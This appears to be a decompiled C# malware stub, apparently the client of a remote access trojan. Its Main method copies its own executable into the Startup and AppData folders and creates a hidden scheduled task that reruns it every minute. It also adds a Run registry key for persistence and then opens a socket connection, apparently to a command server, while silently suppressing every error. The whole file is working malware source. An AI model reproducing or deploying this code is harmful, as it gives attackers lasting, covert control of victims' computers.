using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub;

public class Main
{
	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			ProjectData.EndApp();
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(Settings.path2);
			if (!File.Exists(text))
			{
				File.Copy(Settings.path2, text);
				FileInfo fileInfo = new FileInfo(text);
				fileInfo.Attributes = FileAttributes.Normal;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = Interaction.Environ("appdata");
			string text3 = text2 + "\\" + Path.GetFileName(Settings.path2);
			if (!File.Exists(text3))
			{
				File.Copy(Settings.path2, text3);
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.Arguments = "/create /sc minute /mo 1 /tn \"" + Path.GetFileNameWithoutExtension(Settings.path2) + "\" /tr \"" + text3 + "\"";
				Process process = Process.Start(processStartInfo);
				process.WaitForExit(5000);
				process.Kill();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			string text4 = Interaction.Environ("appdata");
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Path.GetFileNameWithoutExtension(Settings.path2), text4 + "\\" + Path.GetFileName(Settings.path2));
			if (!File.Exists(text4 + "\\" + Path.GetFileName(Settings.path2)))
			{
				File.Copy(Settings.path2, text4 + "\\" + Path.GetFileName(Settings.path2));
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		Settings.dTimer2.Elapsed += Helper.tickees;
		Thread thread = new Thread(ClientSocket.BeginConnect);
		thread.Start();
		Thread thread2 = new Thread(ClientSocket.Ping);
		thread2.Start();
	}
}
